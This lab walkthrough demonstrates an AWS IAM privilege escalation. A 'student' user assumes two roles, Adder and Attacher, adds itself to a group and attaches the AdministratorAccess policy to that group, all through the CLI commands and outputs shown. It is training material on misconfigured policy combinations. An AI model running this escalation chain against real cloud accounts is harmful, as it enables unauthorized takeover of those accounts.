# Dangerous policy combination I

Sometimes one policy itself might not be sufficient to perform a privileged operation, however, multiple policies can allow an IAM user/role to perform a chain of operation which ultimately leads to privilege escalation on the AWS account.

Objective: Leverage the policies attached to the student user and attain administrative privileges on the AWS account.

----

1. Get access to AWS lab credentials.
2. Configure AWS CLI.
3. Check identity with:

```text
aws sts get-caller-identity
```

4. List the policies attached to the `student` user:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-user-policies --user-name student
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}
```

5. Try creating a new user named Bob:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob

An error occurred (AccessDenied) when calling the CreateUser operation: User: arn:aws:iam::527058492733:user/student is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::527058492733:user/Bob because no identity-based policy allows the iam:CreateUser action
```

User creation failed due to insufficient privileges.

6. Get information about the user’s inline policies and enumerate the attached policies:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-user-policies --user-name student
{
    "PolicyNames": [
        "terraform-20230511094032888700000002"
    ]
}
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ aws iam get-user-policy --user-name student --policy-name terraform-20230511094032888700000002
{
    "UserName": "student",
    "PolicyName": "terraform-20230511094032888700000002",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "sts:AssumeRole"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:iam::527058492733:role/Adder",
                    "arn:aws:iam::527058492733:role/Attacher"
                ]
            }
        ]
    }
}
```

Check resources mentioned in policy.

7. Check policies attached to Adder and check the role-policy document:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-role-policies --role-name Adder
{
    "PolicyNames": [
        "AddUser"
    ]
}

┌──(kali㉿kali)-[~]
└─$ aws iam get-role-policy --role-name Adder --policy-name AddUser
{
    "RoleName": "Adder",
    "PolicyName": "AddUser",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "iam:AddUserToGroup",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::527058492733:group/Printers"
            }
        ]
    }
}
```

Role policy says that role Adder has permission to add any user to the Printers group.

8. Assume Adder role with student user:

```text           
┌──(kali㉿kali)-[~]
└─$ aws sts assume-role --role-arn arn:aws:iam::527058492733:role/Adder --role-session-name adder_test
{
    "Credentials": {
        "AccessKeyId": "<access key id>",
        "SecretAccessKey": "<secret access key>",
        "SessionToken": "<session token>",
        "Expiration": "2023-05-11T10:50:20+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAXVNZCLU6ZGABQD4YD:adder_test",
        "Arn": "arn:aws:sts::527058492733:assumed-role/Adder/adder_test"
    }
}
```

Make a note of Credentials and tokens.

9. Set the access key id, secret access key, and session token in environment variables:

```text                                                                                                        
┌──(kali㉿kali)-[~]
└─$ export AWS_ACCESS_KEY_ID=<access key id>
export AWS_SECRET_ACCESS_KEY=<secret access key>
export AWS_SESSION_TOKEN=<session token>
```

10. Add student user to printers group:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam add-user-to-group --group-name Printers --user-name student
```

11. Unset environment variables:

```text
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```

12. List groups for the student user:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-groups-for-user --user-name student
{
    "Groups": [
        {
            "Path": "/",
            "GroupName": "Printers",
            "GroupId": "AGPAXVNZCLU6Z4QWJM7KF",
            "Arn": "arn:aws:iam::527058492733:group/Printers",
            "CreateDate": "2023-05-11T09:40:16+00:00"
        }
    ]
}
```

Successfully added student user to Printers group.

13. Check the policies attached to the Attacher role and check the role-policy document:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-role-policies --role-name Attacher
{
    "PolicyNames": [
        "AttachPolicy"
    ]
}

┌──(kali㉿kali)-[~]
└─$ aws iam get-role-policy --role-name Attacher --policy-name AttachPolicy
{
    "RoleName": "Attacher",
    "PolicyName": "AttachPolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "iam:AttachGroupPolicy",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::527058492733:group/Printers"
            }
        ]
    }
}
```

Role policy says that the role Attacher has permission to attach any policy to the Printers group.

14. Identify the ARN of the AdministratorAccess policy:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-policies | grep 'AdministratorAccess'
            "PolicyName": "AdministratorAccess",
            "Arn": "arn:aws:iam::aws:policy/AdministratorAccess",
            "PolicyName": "AdministratorAccess-Amplify",
            "Arn": "arn:aws:iam::aws:policy/AdministratorAccess-Amplify",
            "PolicyName": "AWSAuditManagerAdministratorAccess",
            "Arn": "arn:aws:iam::aws:policy/AWSAuditManagerAdministratorAccess",
            "PolicyName": "AdministratorAccess-AWSElasticBeanstalk",
            "Arn": "arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk",
```

15. Assume Attacher role:

```text
┌──(kali㉿kali)-[~]
└─$ aws sts assume-role --role-arn arn:aws:iam::527058492733:role/Attacher --role-session-name attacher_test
{
    "Credentials": {
        "AccessKeyId": "<access key id>",
        "SecretAccessKey": "<secret access key>",
        "SessionToken": "<session token>",
        "Expiration": "2023-05-11T11:03:51+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAXVNZCLU646LOFZYTU:attacher_test",
        "Arn": "arn:aws:sts::527058492733:assumed-role/Attacher/attacher_test"
    }
}
```

Make a note of Credentials and tokens.

16. Set the access key id, secret access key, and session token in environment variables:

```text
export AWS_ACCESS_KEY_ID=<access key id>
export AWS_SECRET_ACCESS_KEY=<secret access key>
export AWS_SESSION_TOKEN=<session token>
```

17. Attach AdministratorAccess role to Printers group:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam attach-group-policy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

18. Unset all environment variables:

```text                                                                            
┌──(kali㉿kali)-[~]
└─$ unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```

19. Check policies attached to the Printers group:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-group-policies --group-name Printers
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

Successfully attached AdministratorAccess policy to Printers group.

20. Try creating a new user named Bob to verify Administrator Access:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob
{
    "User": {
        "Path": "/",
        "UserName": "Bob",
        "UserId": "AIDAXVNZCLU6WJG47ZMAA",
        "Arn": "arn:aws:iam::527058492733:user/Bob",
        "CreateDate": "2023-05-11T10:08:49+00:00"
    }
}
```

Successfully performed a privileged operation.
